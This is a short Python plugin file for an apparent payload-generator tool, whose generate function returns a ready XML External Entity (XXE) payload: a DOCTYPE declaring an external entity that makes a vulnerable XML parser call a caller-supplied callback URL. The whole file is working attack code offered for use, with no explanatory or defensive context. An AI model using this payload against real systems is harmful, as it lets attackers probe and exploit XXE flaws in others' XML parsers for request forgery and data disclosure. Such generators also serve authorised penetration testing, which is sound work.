"""External entity XXE payload."""

from __future__ import annotations

__all__ = ["PLUGIN", "generate"]

PLUGIN = {
    "api_version": "1",
    "type": "generator",
    "kind": "xxe_external_entity",
    "entrypoint": "generate",
    "summary": "Minimal external entity XXE payload.",
    "requires_python": [],
    "requires_system": [],
}


def generate(callback_url: str) -> str:
    """
    Minimal external entity XXE payload.

    Params:
    - callback_url: URL to beacon to when executed.

    Returns:
    - Rendered payload string.
    """
    return f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{callback_url}">]><foo>&xxe;</foo>'
